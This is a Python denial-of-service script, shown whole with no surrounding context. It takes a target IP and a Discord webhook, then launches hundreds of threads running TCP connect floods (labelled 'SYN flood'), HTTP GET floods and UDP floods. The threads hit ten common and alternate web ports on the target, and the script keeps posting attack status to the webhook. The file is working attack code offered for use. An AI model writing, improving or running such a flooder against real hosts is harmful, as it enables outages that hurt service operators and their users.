import socket
import requests
import threading
import time
import random
import json


target_ip = input("00.00.00.00")
logging_url = input("https://discord.com/api/webhooks/000")


def tcp_syn_flood(target_ip, target_port):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, (1, 1))
            sock.connect((target_ip, target_port))
            sock.close()
        except Exception as e:
            print(f"Error in TCP SYN flood: {e}")
        time.sleep(0.001)


def http_flood(target_ip, target_port):
    while True:
        try:
            requests.get(f"http://{target_ip}:{target_port}")
        except Exception as e:
            print(f"Error in HTTP flood: {e}")
        time.sleep(0.001)


def udp_flood(target_ip, target_port):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(1024)
            sock.sendto(bytes, (target_ip, target_port))
        except Exception as e:
            print(f"Error in UDP flood: {e}")
        time.sleep(0.001)


def log_to_discord(message):
    payload = {
        "content": message
    }
    requests.post(logging_url, json=payload)


def launch_ddos_attack():
    threads = []


    for _ in range(50):
        thread = threading.Thread(target=tcp_syn_flood, args=(target_ip, 80))
        thread.start()
        threads.append(thread)


    for _ in range(50):
        thread = threading.Thread(target=http_flood, args=(target_ip, 80))
        thread.start()
        threads.append(thread)


    for _ in range(50):
        thread = threading.Thread(target=udp_flood, args=(target_ip, 80))
        thread.start()
        threads.append(thread)

    log_to_discord("Main attack started")


    for _ in range(50):
        thread = threading.Thread(target=tcp_syn_flood, args=(target_ip, 8080))
        thread.start()
        threads.append(thread)


    for _ in range(50):
        thread = threading.Thread(target=http_flood, args=(target_ip, 8080))
        thread.start()
        threads.append(thread)


    for _ in range(50):
        thread = threading.Thread(target=udp_flood, args=(target_ip, 8080))
        thread.start()
        threads.append(thread)

    log_to_discord("Additional attack threads started")


    for _ in range(50):
        thread = threading.Thread(target=tcp_syn_flood, args=(target_ip, 443))
        thread.start()
        threads.append(thread)


    for _ in range(50):
        thread = threading.Thread(target=http_flood, args=(target_ip, 443))
        thread.start()
        threads.append(thread)


    for _ in range(50):
        thread = threading.Thread(target=udp_flood, args=(target_ip, 443))
        thread.start()
        threads.append(thread)

    log_to_discord("More attack threads started")


    for _ in range(50):
        thread = threading.Thread(target=tcp_syn_flood, args=(target_ip, 8443))
        thread.start()
        threads.append(thread)


    for _ in range(50):
        thread = threading.Thread(target=http_flood, args=(target_ip, 8443))
        thread.start()
        threads.append(thread)


    for _ in range(50):
        thread = threading.Thread(target=udp_flood, args=(target_ip, 8443))
        thread.start()
        threads.append(thread)

    log_to_discord("Even more attack threads started")


    for _ in range(50):
        thread = threading.Thread(target=tcp_syn_flood, args=(target_ip, 9090))
        thread.start()
        threads.append(thread)


    for _ in range(50):
        thread = threading.Thread(target=http_flood, args=(target_ip, 9090))
        thread.start()
        threads.append(thread)


    for _ in range(50):
        thread = threading.Thread(target=udp_flood, args=(target_ip, 9090))
        thread.start()
        threads.append(thread)

    log_to_discord("Additional attack threads started")


    for _ in range(50):
        thread = threading.Thread(target=tcp_syn_flood, args=(target_ip, 9443))
        thread.start()
        threads.append(thread)


    for _ in range(50):
        thread = threading.Thread(target=http_flood, args=(target_ip, 9443))
        thread.start()
        threads.append(thread)


    for _ in range(50):
        thread = threading.Thread(target=udp_flood, args=(target_ip, 9443))
        thread.start()
        threads.append(thread)

    log_to_discord("More attack threads started")


    for _ in range(50):
        thread = threading.Thread(target=tcp_syn_flood, args=(target_ip, 9999))
        thread.start()
        threads.append(thread)


    for _ in range(50):
        thread = threading.Thread(target=http_flood, args=(target_ip, 9999))
        thread.start()
        threads.append(thread)


    for _ in range(50):
        thread = threading.Thread(target=udp_flood, args=(target_ip, 9999))
        thread.start()
        threads.append(thread)

    log_to_discord("Even more DDoS attack threads started")


    for _ in range(50):
        thread = threading.Thread(target=tcp_syn_flood, args=(target_ip, 10000))
        thread.start()
        threads.append(thread)


    for _ in range(50):
        thread = threading.Thread(target=http_flood, args=(target_ip, 10000))
        thread.start()
        threads.append(thread)


    for _ in range(50):
        thread = threading.Thread(target=udp_flood, args=(target_ip, 10000))
        thread.start()
        threads.append(thread)

    log_to_discord("Additional attack threads started")


    for _ in range(50):
        thread = threading.Thread(target=tcp_syn_flood, args=(target_ip, 10443))
        thread.start()
        threads.append(thread)


    for _ in range(50):
        thread = threading.Thread(target=http_flood, args=(target_ip, 10443))
        thread.start()
        threads.append(thread)


    for _ in range(50):
        thread = threading.Thread(target=udp_flood, args=(target_ip, 10443))
        thread.start()
        threads.append(thread)

    log_to_discord("More attack threads started")


    for _ in range(50):
        thread = threading.Thread(target=tcp_syn_flood, args=(target_ip, 11000))
        thread.start()
        threads.append(thread)


    for _ in range(50):
        thread = threading.Thread(target=http_flood, args=(target_ip, 11000))
        thread.start()
        threads.append(thread)


    for _ in range(50):
        thread = threading.Thread(target=udp_flood, args=(target_ip, 11000))
        thread.start()
        threads.append(thread)

    log_to_discord("Even more DDoS attack threads started")


launch_ddos_attack()


while True:
    time.sleep(1)
    log_to_discord("Attack is ongoing...")